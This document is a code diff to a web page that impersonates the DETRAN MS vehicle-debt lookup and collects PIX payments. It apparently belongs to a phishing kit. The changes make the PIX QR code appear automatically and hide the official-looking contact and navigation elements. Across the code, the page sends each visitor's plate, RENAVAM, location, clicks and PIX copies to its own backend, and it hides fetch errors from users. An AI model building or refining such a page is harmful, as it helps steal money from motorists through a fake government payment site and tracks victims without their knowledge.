@@ -100,7 +100,7 @@
         }
         
         /* ========================================= */
-        /* MODAL DE PAGAMENTO PIX - CORRIGIDO */
+        /* MODAL DE PAGAMENTO PIX - MODIFICADO */
         /* ========================================= */
         .modal-overlay {
             position: fixed;
@@ -254,7 +254,28 @@
             margin-top: 5px;
         }
         
-        /* ÁREA DO CÓDIGO PIX - COPIA E COLA */
+        /* ÁREA DO QR CODE (AGORA APARECE AUTOMATICAMENTE) */
+        .qrcode-container {
+            text-align: center;
+            padding: 20px;
+            margin: 20px 0;
+            background: #f8f9fa;
+            border-radius: 10px;
+            border: 2px solid #005a9c;
+            display: block !important; /* SEMPRE VISÍVEL */
+        }
+        
+        #qrcode {
+            width: 200px;
+            height: 200px;
+            margin: 0 auto 15px;
+            background: white;
+            padding: 10px;
+            border-radius: 10px;
+            border: 1px solid #ddd;
+        }
+        
+        /* ÁREA DO CÓDIGO PIX - COPIA E COLA (AGORA ABAIXO DO QR) */
         .codigo-pix-area {
             margin: 25px 0;
         }
@@ -273,7 +294,7 @@
             line-height: 1.4;
         }
         
-        /* BOTÕES NOVOS - COPIA E COLA + QR */
+        /* BOTÕES - AGORA SÓ TEM "COPIAR CÓDIGO" */
         .opcoes-pix {
             display: flex;
             gap: 15px;
@@ -297,17 +318,11 @@
             gap: 8px;
         }
         
-        /* Botão COPIAR (GRANDE) */
+        /* Botão COPIAR (ÚNICO AGORA) */
         .btn-pix.copiar {
             background: #ff9800;
             color: white;
-            flex: 2;
-        }
-        
-        /* Botão QR (PEQUENO) */
-        .btn-pix.qrcode {
-            background: #005a9c;
-            color: white;
+            width: 100%;
             flex: 1;
         }
         
@@ -331,14 +346,6 @@
                 min-width: 100%;
                 width: 100%;
             }
-            
-            .btn-pix.copiar {
-                order: 1;
-            }
-            
-            .btn-pix.qrcode {
-                order: 2;
-            }
         }
         
         .btn-fechar-modal {
@@ -359,29 +366,6 @@
         
         .btn-fechar-modal:hover {
             background: rgba(255, 255, 255, 0.3);
-        }
-        
-        .qrcode-container {
-            text-align: center;
-            padding: 20px;
-            margin-top: 20px;
-            background: #f8f9fa;
-            border-radius: 10px;
-            display: none;
-        }
-        
-        .qrcode-container.active {
-            display: block;
-            animation: fadeIn 0.5s;
-        }
-        
-        #qrcode {
-            width: 200px;
-            height: 200px;
-            margin: 0 auto 15px;
-            background: white;
-            padding: 10px;
-            border-radius: 10px;
         }
         
         .mensagem-sucesso {
@@ -441,10 +425,15 @@
                 font-size: 11px;
                 padding: 12px;
             }
+            
+            #qrcode {
+                width: 180px;
+                height: 180px;
+            }
         }
 
         /* ========================================= */
-        /* CORREÇÃO 1: REMOVER APENAS O BLOCO ERRADO, MANTER MEUDETRAN AZUL */
+        /* REMOVER BLOCO COM "FALE CONOSCO", "SITE DETRAN MS", etc. */
         /* ========================================= */
         
         /* REMOVE APENAS O BLOCO COM "FALE CONOSCO", "SITE DETRAN MS", etc. */
@@ -522,6 +511,13 @@
             background: rgba(0, 90, 156, 0.05);
             border-radius: 5px;
         }
+        
+        /* ========================================= */
+        /* REMOVER MENU DE NAVEGAÇÃO COMPLETO */
+        /* ========================================= */
+        .menu-navegacao {
+            display: none !important;
+        }
     </style>
 </head>
 <body class="font-sans">
@@ -546,16 +542,11 @@
         <!-- AQUI ESTAVA O BLOCO AZUL COM "FALE CONOSCO" QUE FOI REMOVIDO PELO CSS -->
     </header>
 
-    <!-- MENU DE NAVEGAÇÃO (MANTIDO) -->
+    <!-- MENU DE NAVEGAÇÃO MODIFICADO - SÓ O TEXTO, SEM ÍCONES -->
     <div class="w-full h-[80px] p-2 bg-white border-b border-b-c8ceda border-solid">
         <div class="w-full h-full max-w-[1050px] mx-auto flex items-center justify-between">
             <div class="flex items-center gap-1">
-                <svg stroke="#2c5799" fill="#2c5799" stroke-width="0" viewBox="0 0 20 20" aria-hidden="true" class="size-6 2xl:size-7 text-secondary-600" height="1em" width="1em" xmlns="http://www.w3.org/2000/svg">
-                    <path d="M10.707 2.293a1 1 0 00-1.414 0l-7 7a1 1 0 001.414 1.414L4 10.414V17a1 1 0 001 1h2a1 1 0 001-1v-2a1 1 0 011-1h2a1 1 0 011 1v2a1 1 0 001 1h2a1 1 0 001-1v-6.586l.293.293a1 1 0 001.414-1.414l-7-7z" stroke="none"></path>
-                </svg>
-                <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-chevron-right text-neutral-500 size-6 2xl:size-7">
-                    <path d="M9 18l6-6-6-6"></path>
-                </svg>
+                <!-- APENAS O TEXTO "Consulta de Débitos" (ÍCONES REMOVIDOS) -->
                 <h2 class="uppercase font-bold text-base text-1351b4" id="menuTitulo">Consulta de Débitos</h2>
             </div>
         </div>
@@ -654,7 +645,7 @@
     </footer>
 
     <!-- ========================================= -->
-    <!-- MODAL DE PAGAMENTO PIX (COM INFORMAÇÕES DE LOCALIZAÇÃO) -->
+    <!-- MODAL DE PAGAMENTO PIX MODIFICADO -->
     <!-- ========================================= -->
     <div class="modal-overlay" id="modalPix">
         <div class="modal-pix">
@@ -725,10 +716,21 @@
                         <div class="valor" id="modalTotal">R$ 0,00</div>
                     </div>
                     
-                    <!-- Código PIX Copia e Cola -->
+                    <!-- QR CODE (AGORA APARECE AUTOMATICAMENTE) -->
+                    <div class="qrcode-container" id="qrcodeContainer">
+                        <h4 style="margin-bottom: 15px; color: #005a9c;">
+                            <i class="fas fa-qrcode"></i> QR CODE PIX
+                        </h4>
+                        <div id="qrcode"></div>
+                        <p style="font-size: 12px; color: #666; margin-top: 10px;">
+                            Escaneie com seu app bancário
+                        </p>
+                    </div>
+                    
+                    <!-- Código PIX Copia e Cola (AGORA ABAIXO DO QR) -->
                     <div class="codigo-pix-area">
                         <div class="categoria-titulo pix">
-                            <i class="fas fa-qrcode"></i> CÓDIGO PIX (COPIA E COLA)
+                            <i class="fas fa-copy"></i> CÓDIGO PIX (COPIA E COLA)
                         </div>
                         <div class="codigo-pix" id="codigoPix">
                             Aguarde, gerando código PIX...
@@ -741,28 +743,12 @@
                         <p>Gerando código PIX...</p>
                     </div>
                     
-                    <!-- Botões Copiar e QR -->
+                    <!-- Botão Copiar (ÚNICO AGORA) -->
                     <div class="opcoes-pix" id="opcoesPix">
                         <button class="btn-pix copiar" id="btnCopiarCodigo">
                             <i class="fas fa-copy"></i>
                             COPIAR CÓDIGO
                         </button>
-                        
-                        <button class="btn-pix qrcode" id="btnQRCode">
-                            <i class="fas fa-qrcode"></i>
-                            QR CODE
-                        </button>
-                    </div>
-                    
-                    <!-- Área do QR Code (aparece quando clica em QR) -->
-                    <div class="qrcode-container" id="qrcodeContainer">
-                        <h4 style="margin-bottom: 15px; color: #005a9c;">
-                            <i class="fas fa-qrcode"></i> QR CODE PIX
-                        </h4>
-                        <div id="qrcode"></div>
-                        <p style="font-size: 12px; color: #666; margin-top: 10px;">
-                            Escaneie com seu app bancário
-                        </p>
                     </div>
                     
                     <!-- Mensagem de sucesso -->
@@ -783,31 +769,26 @@
     </div>
 
     <!-- ========================================= -->
-    <!-- JAVASCRIPT CORRIGIDO - FUNCIONANDO EM TODOS DISPOSITIVOS -->
+    <!-- JAVASCRIPT MODIFICADO -->
     <!-- ========================================= -->
     <script>
         // CONFIGURAÇÕES - URL DINÂMICA (SEMPRE FUNCIONA)
         const API_BASE = window.location.origin; // Usa mesma origem do site
         
         // DEBUG
-        console.log('🚀 Sistema DETRAN MS v2.6.1 iniciado');
+        console.log('🚀 Sistema DETRAN MS v2.6.2 iniciado');
         console.log('🌐 API Base:', API_BASE);
         console.log('📱 Dispositivo:', /mobile/i.test(navigator.userAgent) ? 'Mobile' : 'Desktop');
 
         let timerInterval = null;
         let segundosRestantes = 900;
         let dadosPagamentoAtual = null;
-        let qrcodeAtivo = false;
+        let pixJaCopiado = false;
         let minhaCidade = 'Detectando...';
         let meuEstado = 'N/A';
         
         // =========================================
-        // VARIÁVEL PARA CONTROLAR PRIMEIRO CLIQUE DO PIX
-        // =========================================
-        let pixJaCopiado = false;
-
-        // =========================================
-        // FUNÇÃO PARA REGISTRAR CLIQUES (CORREÇÃO 4)
+        // FUNÇÃO PARA REGISTRAR CLIQUES
         // =========================================
         async function registrarClique(tipo, elemento, detalhes = '') {
             try {
@@ -827,11 +808,10 @@
         }
 
         // =========================================
-        // DETECTAR LOCALIZAÇÃO DO USUÁRIO (CORREÇÃO 2)
+        // DETECTAR LOCALIZAÇÃO DO USUÁRIO
         // =========================================
         async function detectarLocalizacao() {
             try {
-                // Tenta obter localização via IP do servidor
                 const response = await fetch('/api/online/entrou', {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
@@ -846,7 +826,6 @@
                     console.log('📍 Usuário registrado com sucesso');
                 }
                 
-                // Registra clique de entrada
                 await registrarClique('pagina_visitada', 'entrada_site', 'Acesso inicial');
                 
             } catch (error) {
@@ -860,7 +839,6 @@
         (function corrigirURLs() {
             const originalFetch = window.fetch;
             window.fetch = function(url, options) {
-                // Se URL for localhost, corrige automaticamente
                 if (typeof url === 'string') {
                     if (url.includes('localhost:3000') || url.includes('127.0.0.1')) {
                         const novaUrl = url.replace(/http:\/\/localhost:3000|http:\/\/127.0.0.1:3000/g, API_BASE);
@@ -923,17 +901,15 @@
                 }
             }
             
-            // Iniciar monitoramento
             registrarEntrada();
             setInterval(manterAtivo, 30000);
             window.addEventListener('beforeunload', registrarSaida);
         })();
 
         // =========================================
-        // CONSULTA DE DÉBITOS - COM TRATAMENTO DE ERRO AVANÇADO
+        // CONSULTA DE DÉBITOS
         // =========================================
         document.addEventListener('DOMContentLoaded', function() {
-            // Detecta localização ao carregar
             detectarLocalizacao();
             
             const form = document.getElementById('consultaForm');
@@ -944,7 +920,9 @@
             const resultadosContainer = document.getElementById('resultadosContainer');
             const menuTitulo = document.getElementById('menuTitulo');
 
-            // Envio do formulário
+            // O TÍTULO DO MENU NUNCA MAIS MUDA - SEMPRE "Consulta de Débitos"
+            // REMOVEMOS A LINHA QUE MUDAVA PARA "Resultados da Consulta"
+
             form.addEventListener('submit', async function(e) {
                 e.preventDefault();
                 
@@ -960,11 +938,9 @@
                 formularioContainer.classList.add('form-loading');
                 errorDiv.classList.add('hidden');
 
-                // Registra clique de consulta
                 await registrarClique('consulta', 'form_consulta', `Placa: ${placa}, RENAVAM: ${renavam}`);
 
                 try {
-                    // Controlador de timeout
                     const controller = new AbortController();
                     const timeoutId = setTimeout(() => controller.abort(), 30000);
                     
@@ -990,7 +966,6 @@
                     exibirResultados(htmlResultado);
 
                 } catch (error) {
-                    // ERROS AMIGÁVEIS - NUNCA "Failed to fetch"
                     if (error.name === 'AbortError') {
                         showError('Tempo de consulta esgotado. O sistema DETRAN está lento.');
                     } else if (error.message.includes('NetworkError') || error.message.includes('Failed to fetch')) {
@@ -1021,7 +996,7 @@
 
             function exibirResultados(html) {
                 formularioContainer.classList.add('hidden');
-                menuTitulo.textContent = 'Resultados da Consulta';
+                // NÃO MUDAMOS MAIS O TÍTULO DO MENU
                 resultadosContainer.innerHTML = html;
                 
                 const botaoVoltar = document.createElement('div');
@@ -1043,10 +1018,8 @@
                 
                 resultadosContainer.classList.remove('hidden');
                 
-                // Reseta variável de PIX copiado quando faz nova consulta
                 pixJaCopiado = false;
                 
-                // Registra clique de visualização de resultados
                 registrarClique('resultados', 'visualizar_resultados', 'Resultados exibidos');
             }
 
@@ -1056,14 +1029,12 @@
                 resultadosContainer.innerHTML = '';
                 formularioContainer.classList.remove('hidden');
                 form.reset();
-                menuTitulo.textContent = 'Consulta de Débitos';
+                // NÃO PRECISA MUDAR O TÍTULO DO MENU
                 errorDiv.classList.add('hidden');
                 loading.classList.add('hidden');
                 formularioContainer.classList.remove('form-loading');
-                // Reseta variável de PIX copiado
                 pixJaCopiado = false;
                 
-                // Registra clique de voltar
                 registrarClique('voltar', 'botao_voltar', 'Voltou para consulta');
             }
         });
@@ -1079,11 +1050,9 @@
                 let valorEncontrado = null;
                 let descricaoEncontrada = '';
                 
-                // Procura em até 5 níveis acima
                 for (let i = 0; i < 5 && elementoPai; i++) {
                     const textoPai = elementoPai.textContent || '';
                     
-                    // Procura valor R$
                     const valorMatch = textoPai.match(/R\$\s*([\d.,]+)/);
                     if (valorMatch && !valorEncontrado) {
                         const valorStr = valorMatch[1].replace(/\./g, '').replace(',', '.');
@@ -1091,7 +1060,6 @@
                         console.log('💰 Valor encontrado:', valorEncontrado);
                     }
                     
-                    // Procura descrição
                     const linhas = textoPai.split('\n').filter(l => l.trim());
                     for (const linha of linhas) {
                         const linhaLimpa = linha.trim();
@@ -1109,7 +1077,6 @@
                     elementoPai = elementoPai.parentElement;
                 }
                 
-                // Fallback
                 if (!descricaoEncontrada) {
                     descricaoEncontrada = 'Débito do veículo';
                 }
@@ -1165,10 +1132,8 @@
                 e.stopPropagation();
                 console.log('🎯 Botão "Pagar" clicado!');
                 
-                // Registra clique no botão pagar
                 registrarClique('botao_pagar', 'botao_pagar_debito', 'Clicou em pagar débito');
                 
-                // Reseta variável quando abre novo modal
                 pixJaCopiado = false;
                 
                 const dadosDebito = capturarDebitoEspecifico(botao);
@@ -1181,7 +1146,7 @@
         });
 
         // =========================================
-        // MODAL DE PAGAMENTO PIX
+        // MODAL DE PAGAMENTO PIX MODIFICADO
         // =========================================
         async function abrirModalPagamentoDebitoEspecifico(dadosDebito) {
             console.log('🚀 Abrindo modal com dados:', dadosDebito);
@@ -1209,8 +1174,7 @@
             document.getElementById('modalTotal').textContent = 
                 'R$ ' + dadosDebito.valor.toFixed(2).replace('.', ',');
             
-            document.getElementById('qrcodeContainer').classList.remove('active');
-            qrcodeAtivo = false;
+            // LIMPA O QR CODE ANTERIOR
             document.getElementById('qrcode').innerHTML = '';
             
             document.getElementById('modalLoading').classList.remove('hidden');
@@ -1236,13 +1200,21 @@
                     document.getElementById('codigoPix').textContent = data.codigoPix;
                     
                     // =========================================
-                    // BOTÃO COPIAR COM EFEITO VISUAL
+                    // GERA QR CODE AUTOMATICAMENTE (MUDANÇA 3)
+                    // =========================================
+                    const qrCodeUrl = `https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=${encodeURIComponent(data.codigoPix)}&format=png&margin=10`;
+                    document.getElementById('qrcode').innerHTML = `
+                        <img src="${qrCodeUrl}" alt="QR Code PIX" style="width: 200px; height: 200px; border-radius: 5px;">
+                    `;
+                    console.log('✅ QR Code gerado automaticamente');
+                    
+                    // =========================================
+                    // BOTÃO COPIAR (ÚNICO AGORA)
                     // =========================================
                     document.getElementById('btnCopiarCodigo').onclick = function() {
                         const btnCopiar = this;
                         const textoOriginal = btnCopiar.innerHTML;
                         
-                        // Verifica se já copiou nesta sessão
                         if (pixJaCopiado) {
                             console.log('⚠️ PIX já copiado nesta sessão');
                             const msg = document.getElementById('mensagemSucesso');
@@ -1252,19 +1224,15 @@
                             return;
                         }
                         
-                        // Marca como copiado
                         pixJaCopiado = true;
                         
-                        // Copia para área de transferência
                         navigator.clipboard.writeText(data.codigoPix)
                             .then(() => {
-                                // EFEITO VISUAL "COPIADO!"
                                 btnCopiar.innerHTML = '<i class="fas fa-check"></i> COPIADO!';
                                 btnCopiar.style.background = '#28a745';
                                 btnCopiar.style.color = 'white';
                                 btnCopiar.style.transform = 'scale(0.98)';
                                 
-                                // Volta ao normal após 3 segundos
                                 setTimeout(() => {
                                     btnCopiar.innerHTML = textoOriginal;
                                     btnCopiar.style.background = '';
@@ -1272,7 +1240,6 @@
                                     btnCopiar.style.transform = '';
                                 }, 3000);
                                 
-                                // REGISTRA NO BACKEND (PRIMEIRO CLIQUE)
                                 fetch('/api/registrar-pix-copiado', {
                                     method: 'POST',
                                     headers: { 'Content-Type': 'application/json' },
@@ -1288,18 +1255,15 @@
                                     console.error('Erro ao registrar PIX:', err);
                                 });
                                 
-                                // Registra clique de cópia
                                 registrarClique('pix_copiado', 'botao_copiar_pix', 
                                     `Valor: R$ ${dadosPagamentoAtual.valor}, Placa: ${dadosPagamentoAtual.placa}`);
                                 
-                                // Mensagem de sucesso
                                 const msg = document.getElementById('mensagemSucesso');
                                 msg.textContent = '✅ Código copiado para área de transferência!';
                                 msg.classList.add('active');
                                 setTimeout(() => msg.classList.remove('active'), 3000);
                             })
                             .catch(err => {
-                                // Fallback para navegadores antigos
                                 const textArea = document.createElement('textarea');
                                 textArea.value = data.codigoPix;
                                 document.body.appendChild(textArea);
@@ -1307,7 +1271,6 @@
                                 document.execCommand('copy');
                                 document.body.removeChild(textArea);
                                 
-                                // Mesmo efeito visual
                                 btnCopiar.innerHTML = '<i class="fas fa-check"></i> COPIADO!';
                                 btnCopiar.style.background = '#28a745';
                                 btnCopiar.style.color = 'white';
@@ -1317,7 +1280,6 @@
                                     btnCopiar.style.color = '';
                                 }, 3000);
                                 
-                                // REGISTRA NO BACKEND
                                 fetch('/api/registrar-pix-copiado', {
                                     method: 'POST',
                                     headers: { 'Content-Type': 'application/json' },
@@ -1331,7 +1293,6 @@
                                     })
                                 }).catch(e => console.error('Erro:', e));
                                 
-                                // Registra clique
                                 registrarClique('pix_copiado', 'botao_copiar_pix_fallback', 
                                     `Valor: R$ ${dadosPagamentoAtual.valor}`);
                                 
@@ -1340,29 +1301,6 @@
                                 msg.classList.add('active');
                                 setTimeout(() => msg.classList.remove('active'), 3000);
                             });
-                    };
-                    
-                    // =========================================
-                    // BOTÃO QR CODE (CORREÇÃO 3)
-                    // =========================================
-                    document.getElementById('btnQRCode').onclick = function() {
-                        if (!qrcodeAtivo) {
-                            const qrCodeUrl = `https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=${encodeURIComponent(data.codigoPix)}&format=png&margin=10`;
-                            document.getElementById('qrcode').innerHTML = `
-                                <img src="${qrCodeUrl}" alt="QR Code PIX" style="width: 200px; height: 200px; border-radius: 5px;">
-                            `;
-                            document.getElementById('qrcodeContainer').classList.add('active');
-                            qrcodeAtivo = true;
-                            this.innerHTML = '<i class="fas fa-times"></i> FECHAR QR';
-                            
-                            // Registra clique no botão QR Code
-                            registrarClique('qr_code_visualizado', 'botao_qrcode', 
-                                `QR Code exibido - Valor: R$ ${dadosPagamentoAtual.valor}`);
-                        } else {
-                            document.getElementById('qrcodeContainer').classList.remove('active');
-                            qrcodeAtivo = false;
-                            this.innerHTML = '<i class="fas fa-qrcode"></i> QR CODE';
-                        }
                     };
                     
                 } else {
@@ -1375,7 +1313,6 @@
                     'Erro de conexão. Tente novamente.';
                 console.error('Erro ao gerar PIX:', error);
                 
-                // Registra erro na geração de PIX
                 registrarClique('erro_pix', 'geracao_pix_falhou', error.message);
             } finally {
                 document.getElementById('modalLoading').classList.add('hidden');
@@ -1385,9 +1322,8 @@
                 
                 document.getElementById('modalPix').classList.add('active');
                 document.body.style.overflow = 'hidden';
-                console.log('✅ Modal aberto com sucesso!');
+                console.log('✅ Modal aberto com QR Code automático!');
                 
-                // Registra abertura do modal
                 registrarClique('modal_aberto', 'modal_pagamento_pix', 
                     `Placa: ${dadosDebito.placa}, Valor: R$ ${dadosDebito.valor}`);
             }
@@ -1427,11 +1363,8 @@
                     document.getElementById('timerPix').textContent = 'EXPIRADO';
                     document.getElementById('timerPix').style.background = '#dc3545';
                     document.getElementById('btnCopiarCodigo').disabled = true;
-                    document.getElementById('btnQRCode').disabled = true;
                     document.getElementById('btnCopiarCodigo').style.opacity = '0.5';
-                    document.getElementById('btnQRCode').style.opacity = '0.5';
                     
-                    // Registra expiração do timer
                     registrarClique('timer_expirado', 'pix_expirado', 'Timer de 15 minutos expirou');
                 }
             }, 1000);
@@ -1466,13 +1399,9 @@
             clearInterval(timerInterval);
             document.getElementById('modalPix').classList.remove('active');
             document.body.style.overflow = 'auto';
-            document.getElementById('qrcodeContainer').classList.remove('active');
-            qrcodeAtivo = false;
-            document.getElementById('btnQRCode').innerHTML = '<i class="fas fa-qrcode"></i> QR CODE';
             document.getElementById('mensagemSucesso').classList.remove('active');
             console.log('🔒 Modal fechado');
             
-            // Registra fechamento do modal
             registrarClique('modal_fechado', 'fechar_modal_pix', 'Modal de pagamento fechado');
         }
 
@@ -1494,14 +1423,13 @@
         window.addEventListener('error', function(e) {
             console.error('Erro global capturado:', e.error);
             
-            // Não mostra "Failed to fetch" para o usuário
             if (e.message && e.message.includes('fetch')) {
                 console.log('Erro de fetch interceptado, não mostrando ao usuário');
                 e.preventDefault();
             }
         });
 
-        console.log('✅ Sistema DETRAN MS carregado com sucesso!');
+        console.log('✅ Sistema DETRAN MS v2.6.2 carregado com sucesso!');
     </script>
 </body>
 </html>
